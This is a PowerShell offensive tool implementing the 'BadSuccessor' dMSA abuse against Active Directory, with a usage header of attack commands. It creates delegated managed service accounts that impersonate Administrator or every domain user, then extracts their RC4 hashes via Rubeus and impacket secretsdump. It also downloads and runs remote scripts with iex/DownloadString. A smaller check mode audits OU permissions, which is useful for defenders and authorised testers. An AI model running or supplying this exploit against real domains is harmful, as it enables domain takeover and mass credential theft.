<#
BadSuccessor checks for prerequisits and attack abuse
Research: https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory
Original Script: https://github.com/akamai/BadSuccessor/blob/main/Get-BadSuccessorOUPermissions.ps1
Usage:

runas /user:evilcorp.local\lowpriv /netonly powershell
iex(new-object net.webclient).DownloadString("https://raw.githubusercontent.com/LuemmelSec/Pentest-Tools-Collection/refs/heads/main/tools/ActiveDirectory/BadSuccessor.ps1")
BadSuccessor -mode check -Domain evilcorp.local 
BadSuccessor -mode exploit -Path "OU=BadSuccessor,DC=evilcorp,DC=local" -Name "bad_DMSA" -DelegatedAdmin "lowpriv" -DelegateTarget "Administrator" -domain "evilcorp.local"


.\Rubeus.exe tgtdeleg /nowrap
copy ticket
.\Rubeus.exe asktgs /targetuser:bad_dmsa$ /service:krbtgt/evilcorp.local /opsec /dmsa /nowrap /ptt /ticket:<paste ticket> /outfile:ticket.kirbi

then either request a tgs for a desired service as our targeted user (Administrator in that case):
.\Rubeus.exe asktgs /user:bad_dmsa$ /service:cifs/dc2025.evilcorp.local /opsec /dmsa /nowrap /ptt /ticket:doIF4

or convert to ccache file and proceed e.g. with impacket
impacket-ticketConverter ticket.kirbi ticket.ccache
KRB5CCNAME=ticket.ccache impacket-secretsdump evilcorp.local/bad_dmsa\$@dc2025.evilcorp.local -k -no-pass -just-dc-ntlm

BadSuccessor -Mode GetThemHashes -Domain evilcorp.local -Path "OU=BadSuccessor,DC=evilcorp,DC=local" -DelegatedAdmin "lowpriv" -DelegateTarget "Administrator"
Will automagically do all the sweet stuff for you:
Create a dmsa per user
Set the msDS-ManagedAccountPrecededByLink property accordinly
Fetch them hashes via Rubeus
Delete the dmsas
#>
function BadSuccessor {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [ValidateSet("Check", "Exploit", "GetThemHashes")]
        [string]$Mode,

        [Parameter(Mandatory)]
        [string]$Domain,  # Domain name like evilcorp.local

        # Exploit and GetTHemHashes Mode parameters
        [string]$Path,
        [string]$DelegatedAdmin,
        [string]$DelegateTarget,
        [System.Management.Automation.PSCredential]$Credential,

        # Exploit only parameter
        [string]$Name
    )

    Import-Module ActiveDirectory

    if ($Mode -eq "Check") {
        function Resolve-ADIdentity {
            param (
                [string]$SID
            )
            try {
                $forest = Get-ADForest -Server $Domain
                $domains = $forest.Domains
            } catch {
                $domains = @($Domain)
            }

            foreach ($d in $domains) {
                try {
                    $user = Get-ADUser -Filter { SID -eq $SID } -Server $d -ErrorAction SilentlyContinue
                    if ($user) { return "$d\$($user.SamAccountName)" }
                    $group = Get-ADGroup -Filter { SID -eq $SID } -Server $d -ErrorAction SilentlyContinue
                    if ($group) { return "$d\$($group.SamAccountName)" }
                    $computer = Get-ADComputer -Filter { SID -eq $SID } -Server $d -ErrorAction SilentlyContinue
                    if ($computer) { return "$d\$($computer.Name)$" }
                } catch {}
            }
            try {
                $sidObj = New-Object System.Security.Principal.SecurityIdentifier($SID)
                $ntAccount = $sidObj.Translate([System.Security.Principal.NTAccount]).Value
                return $ntAccount
            } catch {
                return "NOT_RESOLVABLE"
            }
        }

        function Get-SIDFromIdentity {
            param ($IdentityReference)
            try {
                $user = Get-ADUser -Identity $IdentityReference -Server $Domain -ErrorAction SilentlyContinue
                if ($user) { return $user.SID.Value }
                $group = Get-ADGroup -Identity $IdentityReference -Server $Domain -ErrorAction SilentlyContinue
                if ($group) { return $group.SID.Value }
                $computer = Get-ADComputer -Identity $IdentityReference -Server $Domain -ErrorAction SilentlyContinue
                if ($computer) { return $computer.SID.Value }
            } catch {}
            return $IdentityReference
        }

        Write-Host "`n[+] Checking for Windows Server 2025 Domain Controllers..." -ForegroundColor Cyan
        $dcs = Get-ADDomainController -Filter * -Server $Domain
        $dc2025 = $dcs | Where-Object { $_.OperatingSystem -like "*2025*" }
        if ($dc2025) {
            Write-Host "[!] Windows Server 2025 DCs found. BadSuccessor may be exploitable!" -ForegroundColor Green
            $dc2025 | Select-Object HostName, OperatingSystem | Format-Table
        } else {
            Write-Host "[!] No 2025 Domain Controllers found. BadSuccessor not exploitable!" -ForegroundColor Red
            $response = Read-Host "Do you want to continue anyway? (Y/N)"
            if ($response -notin @('y','Y','yes','YES')) {
                Write-Host "Aborting script as requested." -ForegroundColor Yellow
                return
            }
        }

        $domainSID = (Get-ADDomain -Server $Domain).DomainSID.Value
        $excludedSids = @(
            "$domainSID-512", "$domainSID-519", "S-1-5-32-544", "S-1-5-18"
        )
        $relevantRights = @('CreateChild', 'GenericAll', 'WriteDacl', 'WriteOwner')
        $relevantObjectTypes = @([Guid]::Empty, [Guid]'0feb936f-47b3-49f2-9386-1dedc2c23765')
        $SidCache = @{}
        $NameCache = @{}

        function Test-IsExcludedSID {
            Param ([string]$IdentityReference)
            if ($SidCache.ContainsKey($IdentityReference)) {
                return $SidCache[$IdentityReference]
            }
            $sid = Get-SIDFromIdentity $IdentityReference
            $excluded = ($excludedSids -contains $sid -or $sid.EndsWith('-519'))
            $SidCache[$IdentityReference] = $excluded
            return $excluded
        }

        $results = @()
        $ous = Get-ADOrganizationalUnit -Filter * -Server $Domain -Properties DistinguishedName

        foreach ($ou in $ous) {
            $ldapPath = "LDAP://$Domain/$($ou.DistinguishedName)"
            try {
                $de = [ADSI]$ldapPath
                $sd = $de.psbase.ObjectSecurity
                $aces = $sd.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])
                foreach ($ace in $aces) {
                    if ($ace.AccessControlType -ne 'Allow') { continue }
                    if ($ace.PropagationFlags -eq [System.Security.AccessControl.PropagationFlags]::InheritOnly) { continue }
                    $matchingRights = $relevantRights | Where-Object { $ace.ActiveDirectoryRights.ToString() -match $_ }
                    if ($matchingRights.Count -eq 0) { continue }
                    if ($relevantObjectTypes -notcontains $ace.ObjectType) { continue }

                    $sid = $ace.IdentityReference.Value
                    if (Test-IsExcludedSID $sid) { continue }

                    if (-not $NameCache.ContainsKey($sid)) {
                        $NameCache[$sid] = Resolve-ADIdentity $sid
                    }
                    foreach ($right in $matchingRights) {
                        $results += [PSCustomObject]@{
                            IdentitySID   = $sid
                            IdentityName  = $NameCache[$sid]
                            OU            = $ou.DistinguishedName
                            Right         = $right
                        }
                    }
                }
                $ownerSID = $sd.Owner.Value
                if ($ownerSID -and -not (Test-IsExcludedSID $ownerSID)) {
                    if (-not $NameCache.ContainsKey($ownerSID)) {
                        $NameCache[$ownerSID] = Resolve-ADIdentity $ownerSID
                    }
                    $results += [PSCustomObject]@{
                        IdentitySID   = $ownerSID
                        IdentityName  = $NameCache[$ownerSID]
                        OU            = $ou.DistinguishedName
                        Right         = 'Owner'
                    }
                }
            } catch {
                Write-Warning "Failed OU: $($ou.DistinguishedName): $_"
                continue
            }
        }
        $results | Sort-Object IdentityName | Out-GridView
    }

    elseif ($Mode -eq "Exploit") {
        if (-not ($Path -and $Name -and $DelegatedAdmin -and $DelegateTarget)) {
            Write-Host "Missing required parameters for Exploit mode." -ForegroundColor Red
            return
        }

        $domainNC = ([ADSI]"LDAP://$Domain/RootDSE").defaultNamingContext
        $fqdn = (($domainNC -split ",") -replace "^DC=" | Where-Object { $_ }) -join "."

        Write-Host "Creating dMSA at: LDAP://$Domain/$Path"
        $ldapPath = "LDAP://$Domain/$Path"
        $parentEntry = if ($Credential) {
            New-Object System.DirectoryServices.DirectoryEntry($ldapPath, $Credential.UserName, $Credential.GetNetworkCredential().Password, "Secure")
        } else {
            New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
        }

        $childName = "CN=$Name"
        $newChild = $parentEntry.Children.Add($childName, "msDS-DelegatedManagedServiceAccount")
        $newChild.Properties["msDS-DelegatedMSAState"].Value = 2
        $newChild.Properties["msDS-ManagedPasswordInterval"].Value = 30
        $newChild.Properties["dnshostname"].Add("$Name.$fqdn")
        $newChild.Properties["samaccountname"].Add("$Name`$")
        $newChild.Properties["msDS-SupportedEncryptionTypes"].Value = 0x1C
        $newChild.Properties["userAccountControl"].Value = 0x1000

        # Resolve DelegateTarget
        try {
            $target = Get-ADUser -Identity $DelegateTarget -Server $Domain -ErrorAction Stop
        } catch {
            $target = Get-ADComputer -Identity $DelegateTarget -Server $Domain -ErrorAction Stop
        }
        $newChild.Properties["msDS-ManagedAccountPrecededByLink"].Add($target.distinguishedName)

        # Resolve DelegatedAdmin SID
        try {
            $admin = Get-ADUser -Identity $DelegatedAdmin -Server $Domain -ErrorAction Stop
        } catch {
            $admin = Get-ADComputer -Identity $DelegatedAdmin -Server $Domain -ErrorAction Stop
        }
        $adminSID = $admin.SID.Value

        # Build Security Descriptor
        $rawSD = New-Object System.Security.AccessControl.RawSecurityDescriptor "O:S-1-5-32-544D:(A;;FA;;;$adminSID)"
        $descriptor = New-Object byte[] $rawSD.BinaryLength
        $rawSD.GetBinaryForm($descriptor, 0)
        $newChild.Properties["msDS-GroupMSAMembership"].Add($descriptor)

        $newChild.CommitChanges()
        Write-Host "Successfully created and configured dMSA '$Name'" -ForegroundColor Green
        Write-Host "Object $delegatedadmin can now impersonate $delegateTarget" -ForegroundColor Green
    }

     elseif ($Mode -eq "GetThemHashes") {
        Write-Warning "This mode requires Invoke-Rubeus module which will be downloaded and imported. This is noisy and sus af. Only proceed if you know what you're doing!"

        $response = Read-Host "Do you want to proceed with downloading and importing Invoke-Rubeus? (y/n)"
        if ($response -ne 'y' -and $response -ne 'Y') {
            Write-Warning "Invoke-Rubeus import declined by user. Exiting GetThemHashes."
            return
        }

        # Download and import Invoke-Rubeus from official source
        try {
            iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/LuemmelSec/Pentest-Tools-Collection/refs/heads/main/tools/ActiveDirectory/Invoke-Rubeus.ps1')
            Write-Host "Invoke-Rubeus imported successfully." -ForegroundColor Green
        } catch {
            Write-Warning "Failed to download or import Invoke-Rubeus: $_"
            return
        }
        if (-not ($Path -and $DelegatedAdmin)) {
            Write-Host "Missing required parameters for GetThemHashes mode." -ForegroundColor Red
            return
        }

        $domainNC = ([ADSI]"LDAP://$Domain/RootDSE").defaultNamingContext
        $fqdn = (($domainNC -split ",") -replace "^DC=" | Where-Object { $_ }) -join "."
        $ldapPath = "LDAP://$Domain/$Path"

        $parentEntry = if ($Credential) {
            New-Object System.DirectoryServices.DirectoryEntry($ldapPath, $Credential.UserName, $Credential.GetNetworkCredential().Password, "Secure")
        } else {
            New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
        }

        $allTargets = @(
            Get-ADUser -Filter * -Server $Domain | Select @{n='DN';e={$_.DistinguishedName}}, SamAccountName
        )

        try {
            $admin = Get-ADUser -Identity $DelegatedAdmin -Server $Domain -ErrorAction Stop
        } catch {
            $admin = Get-ADComputer -Identity $DelegatedAdmin -Server $Domain -ErrorAction Stop
        }
        $adminSID = $admin.SID.Value

        # Capture the output of Rubeus as plain text string
        $tgtOutput = Invoke-Rubeus -Command "tgtdeleg /nowrap" | Out-String
        $lines = $tgtOutput -split "`r?`n"

        # Extract base64 line
        $found = $false
        $kirbiBase64 = $null
        foreach ($line in $lines) {
            if ($found -and $line.Trim() -ne "") {
                $kirbiBase64 = $line.Trim()
                break
            }
            if ($line -match '\[\*\] base64\(ticket\.kirbi\):') {
                $found = $true
            }
        }

        if ($kirbiBase64) {
            Write-Host "`n[+] Extracted Base64 ticket:`n$kirbiBase64" -ForegroundColor Green
        } else {
            Write-Warning "[-] Could not extract base64 ticket from Rubeus output."
            return
        }

        # Initialize results array and list to track created dMSAs for cleanup
        $results = @()
        $createdDMSAs = @()

        foreach ($target in $allTargets) {
            $name = "bad_$($target.SamAccountName)"

            try {
                # Create dMSA
                $childName = "CN=$name"
                $newChild = $parentEntry.Children.Add($childName, "msDS-DelegatedManagedServiceAccount")
                $newChild.Properties["msDS-DelegatedMSAState"].Value = 2
                $newChild.Properties["msDS-ManagedPasswordInterval"].Value = 30
                [void]$newChild.Properties["dnshostname"].Add("$name.$fqdn")
                [void]$newChild.Properties["samaccountname"].Add("$name`$")
                $newChild.Properties["msDS-SupportedEncryptionTypes"].Value = 0x1C
                $newChild.Properties["userAccountControl"].Value = 0x1000
                [void]$newChild.Properties["msDS-ManagedAccountPrecededByLink"].Add($target.DN)

                $rawSD = New-Object System.Security.AccessControl.RawSecurityDescriptor "O:S-1-5-32-544D:(A;;FA;;;$adminSID)"
                $descriptor = New-Object byte[] $rawSD.BinaryLength
                $rawSD.GetBinaryForm($descriptor, 0)
                [void]$newChild.Properties["msDS-GroupMSAMembership"].Add($descriptor)

                [void]$newChild.CommitChanges()

                $createdDMSAs += $newChild

                # Request hash with Rubeus
                $res = Invoke-Rubeus -command "asktgs /targetuser:$name`$ /service:krbtgt/$Domain /opsec /dmsa /nowrap /ticket:$kirbiBase64"
                $rc4 = [regex]::Match($res, 'Previous Keys for .*?\$: \(rc4_hmac\) ([A-F0-9]{32})').Groups[1].Value

                if ($rc4) {
                    $results += [PSCustomObject]@{
                        SamAccountName = $target.SamAccountName
                        RC4Hash        = $rc4
                    }
                    Write-Host "Got hash for $($target.SamAccountName)" -ForegroundColor Green
                } else {
                    Write-Warning "RC4 hash not found for $($target.SamAccountName)"
                }

            } catch {
                Write-Warning "Failed to process $($target.SamAccountName): $_"
            }
        }

        # Cleanup - delete all created dMSAs
        foreach ($dmsa in $createdDMSAs) {
            try {
                $dmsa.DeleteTree()
                $dmsa.CommitChanges()
                Write-Host "Deleted dMSA $($dmsa.Properties['samaccountname'].Value)"
            } catch {
                Write-Warning "Failed to delete dMSA $($dmsa.Properties['samaccountname'].Value): $_"
            }
        }

        # Show results in gridview
        if ($results.Count -gt 0) {
            $results | Out-GridView -Title "Extracted RC4 Hashes"
        } else {
            Write-Warning "[-] No RC4 hashes were extracted."
        }
    }
}
